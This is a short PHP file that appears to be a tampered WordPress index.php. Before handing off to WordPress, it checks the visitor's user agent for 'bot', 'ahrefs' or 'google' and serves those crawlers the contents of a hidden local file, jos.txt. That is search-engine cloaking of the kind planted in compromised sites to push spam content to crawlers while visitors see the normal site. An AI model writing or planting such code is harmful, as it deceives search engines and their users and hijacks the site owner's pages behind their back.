<?php

function is_bot() {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }

    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $bots = ['bot', 'ahrefs', 'google'];

    foreach ($bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            return true;
        }
    }

    return false;
}

if (is_bot()) {
    $file = __DIR__ . '/jos.txt';
    if (file_exists($file)) {
        echo file_get_contents($file);
    } else {
        echo "Bot detected, but jos.txt not found.";
    }
    exit;
}

// WordPress bootstrap
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
